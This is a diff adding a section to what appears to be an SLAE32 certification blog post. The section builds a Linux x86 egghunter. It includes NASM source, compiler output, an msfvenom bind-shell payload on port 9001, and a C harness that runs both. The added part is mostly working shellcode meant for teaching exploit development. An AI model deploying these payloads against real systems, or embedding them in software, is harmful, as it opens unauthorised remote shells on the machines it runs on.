@@ -66,7 +66,113 @@ The following is the key take- aways from the article:
 | NtDisplayString | 32 bytes | No | Smallest, Fastest, Most robust | Static system call number, Fails if Direction Flag (DF) is set |
 
 # Egghunter Shellcode
-For demonstration purposes, I will be using the Linux implementation of `access()` syscall version to build the Egghunter payload. 
+For demonstration purposes, I will be using the Linux implementation of `access()` syscall version to build the Egghunter payload. Let's create the following `egghunter.nasm` file:
+
+```s
+global _start
+
+section .text
+
+_start:
+        mov ebx, 0x50905090     ; 4 byte Egg (*Little-Endian)
+        xor ecx, ecx        ; Zero out ECX
+        mul ecx     ; Zero out EAX and EDX
+
+next_page:
+        or dx, 0xfff        ; Set PAGE_SIZE 4095 (0x1000)
+
+next_addr:
+        inc edx     ; Increment by 4095 (0x1000)
+        pushad      ; Preserve all general purposes register values onto the stack
+        lea ebx, [edx+4]        ; Checking if the address is readable
+        mov al, 0x21        ; Set AL to syscall access() (0x21)
+        int 0x80        ; Soft-interrupt to execute the syscall
+
+        cmp al, 0xf2        ; Check for EFAULT (Invalid memory space)
+        popad       ; Restore the preserved registers
+        jz next_page        ; EFAULT --> Invalid memory space --> Next page
+
+        cmp [edx], ebx      ; Check for the address if it contains our egg
+        jnz next_addr       ; If not, go back to look for our first egg 
+
+        cmp [edx+4], ebx        ; Check for the address + 4 if it contains our second egg 
+        jnz next_addr       ; If not, go back to look for our second egg
+
+        jmp edx     ; Both eggs are found --> JMP to EDX --> Continue execution flow
+```
+
+## Compile + Bind Shellcode (msfvenom)
+
+I created a simple compiler [compilerX86.py](https://github.com/bigb0sss/ASM_Learning/blob/master/compilerX86.py). 
+
+```console
+root@kali:~/Documents/SLAE32/Exam/Assignement3# python compilerX86.py -f egghunter
+ 
+  ________  ________  _____ ______   ________  ___  ___       _______   ________     ___    ___ ________  ________         
+ |\   ____\|\   __  \|\   _ \  _   \|\   __  \|\  \|\  \     |\  ___ \ |\   __  \   |\  \  /  /|\   __  \|\   ____\        
+ \ \  \___|\ \  \|\  \ \  \\\__\ \  \ \  \|\  \ \  \ \  \    \ \   __/|\ \  \|\  \  \ \  \/  / | \  \|\  \ \  \___|      
+  \ \  \    \ \  \\\  \ \  \\|__| \  \ \   ____\ \  \ \  \    \ \  \_|/_\ \   _  _\  \ \    / / \ \   __  \ \  \____   
+   \ \  \____\ \  \\\  \ \  \    \ \  \ \  \___|\ \  \ \  \____\ \  \_|\ \ \  \\  \|  /     \/   \ \  \|\  \ \  ___  \ 
+    \ \_______\ \_______\ \__\    \ \__\ \__\    \ \__\ \_______\ \_______\ \__\\ _\ /  /\   \    \ \_______\ \_______\ 
+     \|_______|\|_______|\|__|     \|__|\|__|     \|__|\|_______|\|_______|\|__|\|__/__/ /\ __\    \|_______|\|_______|    
+                                                                                    |__|/ \|__|     [bigb0ss] v1.0         
+
+[+] Assemble: egghunter.nasm
+[+] Linking: egghunter.o
+[+] Shellcode: "\xbb\x90\x50\x90\x50\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x60\x8d\x5a\x04\xb0\x21\xcd\x80\x3c\xf2\x61\x74\xed\x39\x1a\x75\xee\x39\x5a\x04\x75\xe9\xff\xe2"
+[+] Creating File: shellcode.c
+[+] Compiling Executable: shellcode
+[+] Enjoy!
+```
+
+Additionally, using msfvenom, let's create a bind shell:
+
+```console
+root@kali:~/Documents/SLAE32/Exam/Assignement3# msfvenom -p linux/x86/shell_bind_tcp lport=9001 -f c
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 78 bytes
+Final size of c file: 354 bytes
+unsigned char buf[] = 
+"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
+"\x5b\x5e\x52\x68\x02\x00\x23\x29\x6a\x10\x51\x50\x89\xe1\x6a"
+"\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0"
+"\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f"
+"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0"
+"\x0b\xcd\x80";
+```
+
+## Final Touch
+
+Finally, let's combine those bind shellcode and egghunter to create the following exploit script `egghunter.c`:
+
+```c
+#include <stdio.h>
+
+unsigned char egghunter[] = \
+"\xbb\x90\x50\x90\x50\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42"
+"\x60\x8d\x5a\x04\xb0\x21\xcd\x80\x3c\xf2\x61\x74\xed\x39\x1a"
+"\x75\xee\x39\x5a\x04\x75\xe9\xff\xe2";
+
+unsigned char shellcode[] = \
+"\x90\x50\x90\x50\x90\x50\x90\x50"  // Egg
+"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
+"\x5b\x5e\x52\x68\x02\x00\x23\x29\x6a\x10\x51\x50\x89\xe1\x6a"
+"\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0"
+"\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f"
+"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0"
+"\x0b\xcd\x80";
+
+void main() {
+    int (*ret)() = (int(*)())egghunter;
+    ret();
+
+    return 0;
+}
+```
+
+![image](/assets/img/post/slae32/assignment3/03.png)
 
 
 <b>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:</b>
